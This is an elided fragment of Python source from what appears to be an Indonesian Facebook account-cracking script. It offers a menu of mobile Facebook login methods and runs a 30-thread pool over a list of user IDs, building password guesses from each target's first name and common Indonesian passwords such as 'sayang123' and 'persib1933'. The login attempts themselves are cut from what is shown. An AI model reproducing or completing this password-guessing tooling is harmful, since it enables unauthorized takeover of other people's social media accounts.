...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode M.facebook.com [ Suport Wifi ][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic.facebook.com [ Tidak Suport Wifi ]',width=80,title=f"[bold green]Setting Metode",style=f"bold white"))
	print('')
	...
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				frs = nmf.split(' ')[0]
				pwv = ['sayang','persib1933','persija1928','sayang123','kata sandi']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
